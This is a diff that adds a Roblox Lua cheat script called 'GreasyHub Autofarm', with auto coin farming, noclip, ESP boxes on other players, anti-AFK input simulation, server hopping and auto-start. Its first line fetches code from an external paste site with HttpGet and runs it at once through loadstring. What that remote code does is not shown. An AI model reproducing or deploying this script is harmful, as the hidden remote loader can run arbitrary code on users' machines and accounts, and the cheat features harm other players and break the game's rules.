@@ -1,0 +1,298 @@
+-- Run your first script immediately
+loadstring(game:HttpGet("https://paste.debian.net/plainh/bc5a6c4f/", true))()
+
+-- Wait 0.5 seconds
+task.wait(0.5)
+
+-- Now, GreasyHub autofarm GUI script starts here:
+
+-- SERVICES
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local VirtualUser = game:GetService("VirtualUser")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+
+-- VARIABLES
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local rootPart = character:WaitForChild("HumanoidRootPart")
+local visitedPositions = {}
+local isActive = false
+local flySpeed = 15
+local collected = 0
+local startTime = 0
+local antiAFK = false
+local espEnabled = false
+local antiFling = false
+
+player.CharacterAdded:Connect(function(char)
+	character = char
+	rootPart = char:WaitForChild("HumanoidRootPart")
+	visitedPositions = {}
+end)
+
+-- SOUND
+local collectSound = Instance.new("Sound", rootPart)
+collectSound.SoundId = "rbxassetid://12221967"
+collectSound.Volume = 1
+
+-- GUI CREATION
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "GreasyMain"
+gui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 280, 0, 380)
+frame.Position = UDim2.new(0.5, -140, 0.3, 0)
+frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+local stroke = Instance.new("UIStroke", frame)
+stroke.Color = Color3.fromRGB(0, 255, 0)
+stroke.Thickness = 2
+
+local function makeButton(y, text)
+	local btn = Instance.new("TextButton", frame)
+	btn.Size = UDim2.new(0, 240, 0, 30)
+	btn.Position = UDim2.new(0.5, -120, 0, y)
+	btn.Text = text
+	btn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+	btn.TextColor3 = Color3.fromRGB(0, 255, 0)
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 14
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+	return btn
+end
+
+local function makeLabel(y, text)
+	local lbl = Instance.new("TextLabel", frame)
+	lbl.Size = UDim2.new(0, 240, 0, 20)
+	lbl.Position = UDim2.new(0.5, -120, 0, y)
+	lbl.Text = text
+	lbl.BackgroundTransparency = 1
+	lbl.TextColor3 = Color3.fromRGB(0, 255, 0)
+	lbl.Font = Enum.Font.Gotham
+	lbl.TextSize = 14
+	lbl.TextXAlignment = Enum.TextXAlignment.Left
+	return lbl
+end
+
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, -20, 0, 40)
+title.Position = UDim2.new(0, 10, 0, 5)
+title.Text = "GreasyHub Autofarm"
+title.TextColor3 = Color3.fromRGB(0, 255, 0)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+local separator = Instance.new("Frame", frame)
+separator.Size = UDim2.new(1, -20, 0, 1)
+separator.Position = UDim2.new(0, 10, 0, 45)
+separator.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+
+local credit = Instance.new("TextLabel", frame)
+credit.Size = UDim2.new(1, -20, 0, 20)
+credit.Position = UDim2.new(0, 10, 1, -20)
+credit.Text = "Made by Greasy"
+credit.TextColor3 = Color3.fromRGB(0, 255, 0)
+credit.BackgroundTransparency = 1
+credit.Font = Enum.Font.Gotham
+credit.TextSize = 12
+credit.TextXAlignment = Enum.TextXAlignment.Right
+
+-- Buttons and labels
+local toggleBtn = makeButton(60, "Auto Farm: OFF")
+local afkBtn = makeButton(100, "Anti-AFK: OFF")
+local speedBtn = makeButton(140, "Tween Speed: 15")
+local counterLabel = makeLabel(180, "Coins Collected: 0")
+local timerLabel = makeLabel(205, "Time Active: 0s")
+local rateLabel = makeLabel(230, "Est. Coins/Hour: 0")
+local espBtn = makeButton(260, "ESP: OFF")
+local hopBtn = makeButton(300, "🌍 Server Hop")
+local antiFlingBtn = makeButton(340, "Anti-Fling: OFF")
+
+local hideBtn = Instance.new("TextButton", gui)
+hideBtn.Size = UDim2.new(0, 110, 0, 35)
+hideBtn.Position = UDim2.new(1, -120, 1, -45)
+hideBtn.Text = "Hide GUI"
+hideBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+hideBtn.TextColor3 = Color3.fromRGB(0, 255, 0)
+hideBtn.Font = Enum.Font.GothamBold
+hideBtn.TextSize = 14
+Instance.new("UICorner", hideBtn).CornerRadius = UDim.new(0, 6)
+
+hideBtn.MouseButton1Click:Connect(function()
+	frame.Visible = not frame.Visible
+	hideBtn.Text = frame.Visible and "Hide GUI" or "Show GUI"
+end)
+
+-- Anti-AFK toggle
+afkBtn.MouseButton1Click:Connect(function()
+	antiAFK = not antiAFK
+	afkBtn.Text = antiAFK and "Anti-AFK: ON" or "Anti-AFK: OFF"
+end)
+
+player.Idled:Connect(function()
+	if antiAFK then
+		VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+		task.wait(1)
+		VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+	end
+end)
+
+-- Tween Speed toggle
+speedBtn.MouseButton1Click:Connect(function()
+	flySpeed += 1
+	if flySpeed > 25 then flySpeed = 10 end
+	speedBtn.Text = "Tween Speed: " .. flySpeed
+end)
+
+-- ESP toggle
+local function toggleESP(enabled)
+	for _, p in pairs(Players:GetPlayers()) do
+		if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+			if enabled then
+				local box = Instance.new("BoxHandleAdornment", p.Character.HumanoidRootPart)
+				box.Name = "GreasyESP"
+				box.Adornee = p.Character.HumanoidRootPart
+				box.AlwaysOnTop = true
+				box.ZIndex = 10
+				box.Size = Vector3.new(4, 6, 2)
+				box.Color3 = Color3.fromRGB(0, 255, 0)
+				box.Transparency = 0.2
+			else
+				for _, v in pairs(p.Character.HumanoidRootPart:GetChildren()) do
+					if v:IsA("BoxHandleAdornment") and v.Name == "GreasyESP" then
+						v:Destroy()
+					end
+				end
+			end
+		end
+	end
+end
+
+espBtn.MouseButton1Click:Connect(function()
+	espEnabled = not espEnabled
+	espBtn.Text = espEnabled and "ESP: ON" or "ESP: OFF"
+	toggleESP(espEnabled)
+end)
+
+-- Server hop button
+hopBtn.MouseButton1Click:Connect(function()
+	local gameId = game.PlaceId
+	local success, response = pcall(function()
+		return game:HttpGet("https://games.roblox.com/v1/games/" .. gameId .. "/servers/Public?sortOrder=Asc&limit=100")
+	end)
+	if success then
+		local data = HttpService:JSONDecode(response)
+		for _, server in ipairs(data.data) do
+			if server.playing < server.maxPlayers and server.id ~= game.JobId then
+				TeleportService:TeleportToPlaceInstance(gameId, server.id)
+				break
+			end
+		end
+	end
+end)
+
+-- Anti-Fling toggle
+antiFlingBtn.MouseButton1Click:Connect(function()
+	antiFling = not antiFling
+	antiFlingBtn.Text = antiFling and "Anti-Fling: ON" or "Anti-Fling: OFF"
+end)
+
+-- Anti-Fling logic
+RunService.Heartbeat:Connect(function()
+	if antiFling and character and rootPart then
+		rootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+		rootPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+	end
+end)
+
+-- Disable collision when autofarm active
+RunService.Stepped:Connect(function()
+	if isActive and character then
+		for _, v in ipairs(character:GetDescendants()) do
+			if v:IsA("BasePart") then
+				v.CanCollide = false
+			end
+		end
+	end
+end)
+
+-- Fly to target function
+local function flyTo(pos, speed)
+	if not rootPart then return end
+	local distance = (pos - rootPart.Position).Magnitude
+	local duration = distance / speed
+	local tween = TweenService:Create(rootPart, TweenInfo.new(duration, Enum.EasingStyle.Linear), {CFrame = CFrame.new(pos)})
+	tween:Play()
+	tween.Completed:Wait()
+end
+
+-- Autofarm toggle button logic
+toggleBtn.MouseButton1Click:Connect(function()
+	isActive = not isActive
+	toggleBtn.Text = isActive and "Auto Farm: ON" or "Auto Farm: OFF"
+	toggleBtn.BackgroundColor3 = isActive and Color3.fromRGB(0, 100, 0) or Color3.fromRGB(15, 15, 15)
+
+	if isActive then
+		collected = 0
+		startTime = tick()
+		visitedPositions = {}
+
+		-- Update time and rate display
+		task.spawn(function()
+			while isActive do
+				local elapsed = tick() - startTime
+				timerLabel.Text = "Time Active: " .. math.floor(elapsed) .. "s"
+				local rate = elapsed > 0 and math.floor((collected / elapsed) * 3600) or 0
+				rateLabel.Text = "Est. Coins/Hour: " .. rate
+				task.wait(0.1)
+			end
+		end)
+
+		-- Autofarm loop
+		task.spawn(function()
+			while isActive do
+				character = player.Character or player.CharacterAdded:Wait()
+				rootPart = character:FindFirstChild("HumanoidRootPart")
+				if rootPart then
+					local closest, shortest = nil, math.huge
+					for _, obj in ipairs(workspace:GetDescendants()) do
+						if obj:IsA("BasePart") and obj.Name == "Coin_Server" then
+							local dist = (obj.Position - rootPart.Position).Magnitude
+							if dist < shortest and dist < 250 and not visitedPositions[obj] then
+								closest = obj
+								shortest = dist
+							end
+						end
+					end
+
+					if closest and closest:IsDescendantOf(workspace) then
+						flyTo(closest.Position, flySpeed)
+						if closest and closest:IsDescendantOf(workspace) then
+							visitedPositions[closest] = true
+							collected += 1
+							collectSound:Play()
+							counterLabel.Text = "Coins Collected: " .. collected
+						end
+					end
+				end
+				task.wait(0.1)
+			end
+		end)
+	end
+end)
+
+-- Optionally, start autofarm automatically after 0.5 seconds:
+task.delay(0.5, function()
+	if not isActive then
+		toggleBtn:Activate()
+	end
+end)
